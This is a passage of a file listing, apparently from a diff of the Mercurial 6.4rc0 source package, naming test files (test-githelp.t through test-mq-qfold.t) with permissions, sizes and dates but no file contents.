+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8772 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-githelp.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    16188 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-globalopts.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   150556 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-glog-beautifygraph.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1784 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-glog-topological.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   103725 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-glog.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1181 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-gpg.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18653 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-graft-interrupted.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18392 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-graft-rename.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23358 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-graft.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    38658 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-grep.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10253 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hardlinks.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2003 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hashutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9357 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-help-hide.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)   128642 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-help.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1643 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hg-parseurl.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1128 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hghave.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12337 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgignore.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1081 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgk.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8333 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgrc.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18885 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgweb-annotate-whitespace.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5615 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgweb-auth.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5923 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgweb-auth.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      788 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgweb-bundle.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    75077 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgweb-commands.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4853 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgweb-csp.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15593 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgweb-descend-empties.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    33421 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgweb-diffs.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11671 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgweb-empty.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    55770 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgweb-filelog.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2586 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgweb-head.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    52934 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgweb-json.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3974 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgweb-no-path-info.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4554 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgweb-no-request-uri.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2682 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgweb-non-interactive.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7427 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgweb-raw.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7184 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgweb-removed.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    66313 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgweb-symrev.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    25486 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgweb.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1310 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgwebdir-gc.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1135 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgwebdir-paths.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    55395 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgwebdir.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1650 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hgwebdirsym.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    38679 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-highlight.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    16047 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-histedit-arguments.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7495 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-histedit-base.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4868 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-histedit-bookmark-motion.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14894 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-histedit-commute.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4253 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-histedit-drop.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13888 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-histedit-edit.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8748 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-histedit-fold-non-commute.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15025 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-histedit-fold.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2109 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-histedit-merge-tools.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2109 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-histedit-no-backup.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6771 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-histedit-no-change.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4855 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-histedit-non-commute-abort.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8643 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-histedit-non-commute.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    16204 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-histedit-obsolete.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4253 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-histedit-outgoing.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1658 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-histedit-templates.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    39716 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hook.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3424 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hooklib-changeset_obsoleted.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2586 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hooklib-changeset_published.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1332 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hooklib-enforce_draft_commits.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2383 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hooklib-reject_merge_commits.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1443 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hooklib-reject_new_heads.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    73170 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-http-bad-server.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3037 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-http-branchmap.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15583 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-http-bundle1.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4808 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-http-clone-r.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    36449 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-http-permissions.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    26308 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-http-protocol.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6588 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-http-proxy.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    24997 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-http.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    26348 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-https.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    55194 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-hybridencode.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2011 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-i18n.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3622 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-identify.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1997 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-impexp-branch.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9395 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-import-bypass.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2458 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-import-context.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3704 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-import-eol.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    20483 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-import-git.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4326 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-import-merge.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1410 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-import-unknown.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    46738 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-import.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4550 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-imports-checker.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12486 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-incoming-outgoing.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11558 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-infinitepush-bundlestore.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11925 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-infinitepush-ci.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5503 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-infinitepush.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5190 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-inherit-mode.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8091 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-init.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11932 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-install.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      315 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue1089.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      758 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue1102.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1942 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue1175.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2172 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue1306.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      384 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue1438.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1186 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue1502.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1637 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue1802.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1124 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue1877.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1192 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue1993.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1580 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue2137.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10113 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue3084.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      539 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue4074.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1471 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue522.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2023 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue586.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      658 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue5979.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      634 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue612.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      766 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue619.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    19399 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue6528.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2291 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue660.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      964 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue6642.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2935 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue672.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      742 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-issue842.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1232 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-journal-exists.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4778 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-journal-share.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9065 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-journal.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    32361 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-keyword.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1278 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-known.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7997 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-largefiles-cache.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    33975 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-largefiles-misc.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2057 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-largefiles-small-disk.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    26281 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-largefiles-update.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13520 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-largefiles-wireproto.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    51951 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-largefiles.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1032 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-legacy-exit-code.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13714 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-lfconvert.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2848 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-lfs-bundle.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11706 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-lfs-largefiles.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1190 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-lfs-pointer.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      850 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-lfs-pointer.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    30811 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-lfs-serve-access.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    27515 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-lfs-serve.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    36644 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-lfs-test-server.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    42071 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-lfs.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7649 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-linelog.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7590 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-linerange.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      122 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-locale.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2323 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-locate.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4245 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-lock-badness.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6026 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-lock.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4833 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-log-bookmark.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1642 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-log-exthook.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    18865 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-log-linerange.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    68329 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-log.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14206 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-logexchange.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3530 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-logtoprocess.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10794 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-lrucachedict.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3199 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mac-packages.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      980 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mactext.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2382 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mailmap.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      752 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-manifest-merging.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15640 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-manifest.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12481 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-manifest.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    44127 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-match.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      567 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mdiff.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    40965 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-changedelete.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2313 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-closedheads.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1918 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-combination-exec-bytes.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2274 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-combination-file-content.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1676 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-combination-misc.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5133 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-commit.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    32155 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-criss-cross.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4851 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-default.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8918 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-exec.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    34758 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-force.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4777 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-halt.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3361 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-internal-tools-pattern.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3449 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-local.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10097 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-no-file-change.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9347 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-partial-tool.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2360 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-remove.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1369 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-revert.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1917 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-revert2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3860 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-subrepos.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1554 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-symlinks.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    50588 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-tools.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13943 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge-types.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11059 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge1.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1499 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge10.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1215 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge2.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1897 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge4.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      853 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge5.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1940 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge6.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3847 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge7.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      727 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge8.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1735 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-merge9.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1254 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-minifileset.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5522 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-minirst.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    21558 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-minirst.py.out
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1288 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-missing-capability.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4378 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-eol.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4771 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-git.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10778 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-guards.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17910 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-header-date.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    20216 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-header-from.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3470 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-merge.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3570 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-missingfiles.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2933 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-pull-from-bundle.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4092 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-qclone-http.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3561 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-qdelete.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2507 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-qdiff.t
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4831 2023-03-02 22:29:51.000000 mercurial-6.4rc0/tests/test-mq-qfold.t
